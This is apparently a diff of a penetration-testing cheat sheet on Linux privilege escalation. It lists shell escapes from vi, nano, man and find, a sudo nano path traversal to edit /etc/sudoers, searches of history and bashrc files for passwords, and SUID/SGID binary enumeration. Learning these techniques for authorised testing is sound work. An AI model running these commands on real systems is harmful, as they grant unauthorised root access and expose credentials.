@@ -2,13 +2,37 @@
 
 [https://gtfobins.github.io/](https://gtfobins.github.io/)
 
+## vi
+
+``` bash
+vi -c ':!/bin/sh' /dev/null
+```
+
+``` bash
+vi
+:set shell=/bin/sh
+:shell
+```
+
+## nano
+
+``` bash
+nano
+^R^X
+reset; sh 1>&0 2>&0
+```
+
+``` bash
+sudo nano /var/opt/../../etc/sudoers
+```
+
 ## man
 
 ``` bash 
 man nikto
 ```
 
-### Spawn shell
+Spawn shell
 
 In Manual page, we can execute `!/bin/bash` to spawn a shell.
 
@@ -28,7 +52,7 @@ NAME
 └─$ 
 ```
 
-### Searching commands
+Searching commands
 
 ``` bash
 ┌──(Hades㉿192.168.11.130)-[0.9:13.5]~
@@ -52,14 +76,14 @@ vncpasswd (1)        - set passwords for VNC server
 find / -name "<name>"
 ```
 
-### Check history, bashrc, backup
+Check history, bashrc, backup
 
 ``` bash
 find / -name *history* 2>/dev/null
 find / -name *bashrc* -exec grep passwod {} \; 2>/dev/null
 ```
 
-### Binaries That AutoElevate
+Binaries That AutoElevate
 
 ``` bash
 find / -perm -1000 -type d 2>/dev/null   # Sticky bit - Only the owner of the directory or the owner of a file can delete or rename here.
@@ -73,34 +97,8 @@ for i in `locate -r "bin$"`; do find $i \( -perm -4000 -o -perm -2000 \) -type f
 find / -perm -g=s -o -perm -4000 ! -type l -maxdepth 3 -exec ls -ld {} \; 2>/dev/null
 ```
 
-### Spawn shell
+Spawn shell
 
 ``` bash
 find . -exec /bin/sh \;
-```
-
-## Editing Files
-
-### nano spawn shell
-
-``` bash
-nano
-^R^X
-reset; sh 1>&0 2>&0
-```
-
-``` bash
-sudo nano /var/opt/../../etc/sudoers
-```
-
-### vi spawn shell
-
-``` bash
-vi -c ':!/bin/sh' /dev/null
-```
-
-``` bash
-vi
-:set shell=/bin/sh
-:shell
 ```
